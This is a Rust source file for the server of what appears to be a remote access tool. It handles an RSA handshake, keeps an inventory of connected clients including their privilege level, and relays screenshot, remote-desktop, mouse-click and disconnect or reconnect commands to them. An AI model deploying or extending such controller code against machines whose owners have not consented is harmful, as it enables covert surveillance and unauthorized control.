use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };
use tauri::{ AppHandle, Manager };

use common::async_impl::packets::ClientInfo;

use rand::rngs::OsRng;
use rand::Rng;
use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use base64::{engine::general_purpose, Engine as _};

use common::async_impl::packets::*;

use anyhow::{Context, Result};

use crate::commands::*;

use common::{ENC_TOK_LEN, RSA_BITS};

use serde::Serialize;

#[derive(Debug, Clone, Serialize)]
struct FrontClientNotification {
    pub username: String,
    pub addr: String,
}


pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
        };

        s.channel_loop().await;

        Ok(())
    }
    
    async fn emit_client_connected(&self, client_info: &ClientInfo, addr: &SocketAddr) {
        if let Some(handle) = &self.tauri_handle {
            let _ = handle
                .lock()
                .unwrap()
                .emit_all("client_connected", FrontClientNotification { username: client_info.username.clone(), addr: addr.to_string() })
                .unwrap_or_else(|e| println!("Failed to emit client_connected event: {}", e));
        }
    }
    
    async fn emit_client_disconnected(&self, addr: &SocketAddr) {
        let username = if let Some(client_info) = self.connected_users.get(addr) {
            client_info.username.clone()
        } else {
            addr.to_string()
        };
        
        if let Some(handle) = &self.tauri_handle {
            match handle.lock().unwrap().emit_all("client_disconnected", FrontClientNotification { username: username.clone(), addr: addr.to_string() }) {
                Ok(_) => println!("Successfully emitted client_disconnected event for {}", username),
                Err(e) => println!("Failed to emit client_disconnected event: {}", e),
            }
        }
    }

    async fn channel_loop(mut self) {
        loop {
            use crate::commands::ServerCommand::*;

            let p = match self.receiver.recv().await {
                Some(p) => p,
                None => break,
            };

            match p {
                EncryptionRequest(tx, otx) => {
                    let mut token = [0u8; ENC_TOK_LEN];
                    OsRng.fill(&mut token);
                    tx.send(ClientCommand::Write(
                        ClientboundPacket::EncryptionResponse(
                            self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                            token.to_vec(),
                        ),
                    ))
                    .await
                    .unwrap();
                    otx.send(token.to_vec()).unwrap();
                }
                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    let t = {
                        let padding = PaddingScheme::new_pkcs1v15_encrypt();
                        self.priv_key
                            .decrypt(padding, &enc_t)
                            .expect("Failed to decrypt.")
                    };
                    if t != exp_t {
                        eprintln!("Encryption handshake failed!");
                        tx.send(ClientCommand::Close).await.ok();
                        otx.send(Err(())).unwrap();
                    } else {
                        let s = {
                            let padding = PaddingScheme::new_pkcs1v15_encrypt();
                            self.priv_key
                                .decrypt(padding, &enc_s)
                                .expect("Failed to decrypt.")
                        };
                        otx.send(Ok(s.clone())).unwrap();
                        tx.send(ClientCommand::SetSecret(Some(s.clone())))
                            .await
                            .unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::EncryptionAck))
                            .await
                            .unwrap();

                        // After successful encryption, request client info
                        tx.send(ClientCommand::Write(ClientboundPacket::InitClient))
                            .await
                            .unwrap();
                    }
                }
                RegisterClient(tx, addr, client_info) => {                    // Store the client's connection sender
                    self.txs.insert(addr, tx);
                    self.connected_users.insert(addr, client_info.clone());
                                        
                    self.emit_client_connected(&client_info, &addr).await;
                }
                ScreenshotData(_addr, screenshot_data) => {                    
                    let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("client_screenshot", base64_img).unwrap_or_else(|e| println!("Failed to emit client_screenshot event: {}", e));
                    } else {
                        println!("Cannot send client_screenshot event: Tauri handle not set");
                    }
                }
                TakeScreenshot(addr, display) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ScreenshotDisplay(display)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send screenshot request: {}", e));
                    }
                }
                StartRemoteDesktop(addr, config) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StartRemoteDesktop(config)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send start remote desktop request: {}", e));
                    }
                }
                StopRemoteDesktop(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StopRemoteDesktop))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send stop remote desktop request: {}", e));
                    }
                }  
                MouseClick(addr, click_data) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::MouseClick(click_data)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send mouse click request: {}", e));
                    }
                }
                RemoteDesktopFrame(addr, frame) => {
                    let base64_img = general_purpose::STANDARD.encode(&frame.data);

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "timestamp": frame.timestamp,
                        "display": frame.display,
                        "data": base64_img
                    });
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("remote_desktop_frame", payload).unwrap_or_else(|e| println!("Failed to emit remote_desktop_frame event: {}", e));
                    } else {
                        println!("Cannot send remote_desktop_frame event: Tauri handle not set");
                    }
                }
                GetClients(resp) => {
                    let mut clients = Vec::new();
                    
                    for (addr, client_info) in self.connected_users.iter() {
                        clients.push(crate::handlers::FrontClient {
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(addr),
                            is_elevated: client_info.is_elevated,
                        });
                    }
                    
                    resp.send(clients).ok();
                }
                GetClient(addr, resp) => {
                    if let Some(client_info) = self.connected_users.get(&addr) {
                        let front_client = crate::handlers::FrontClient {
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(&addr),
                            is_elevated: client_info.is_elevated,
                        };
                        
                        resp.send(Some(front_client)).ok();
                    } else {
                        resp.send(None).ok();
                    }
                }
                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                }
                ClientDisconnected(addr) => {
                    self.txs.remove(&addr);
                    
                    let client_info = self.connected_users.remove(&addr);
                    
                    if let Some(client_info) = client_info.clone() {
                        let username = client_info.username.clone();                        
                        if let Some(handle) = &self.tauri_handle {
                            match handle.lock().unwrap().emit_all("client_disconnected", FrontClientNotification { username: username.clone(), addr: addr.to_string() }) {
                                Ok(_) => println!("Successfully emitted client_disconnected event for {}", username),
                                Err(e) => println!("Failed to emit client_disconnected event: {}", e),
                            }
                        }
                    } else {
                        self.emit_client_disconnected(&addr).await;
                    }
                },
                DisconnectClient(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::Disconnect))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send disconnect request: {}", e));
                    }
                }
                ReconnectClient(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::Reconnect))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send reconnect request: {}", e));
                    }
                }
            }
        }
    }
}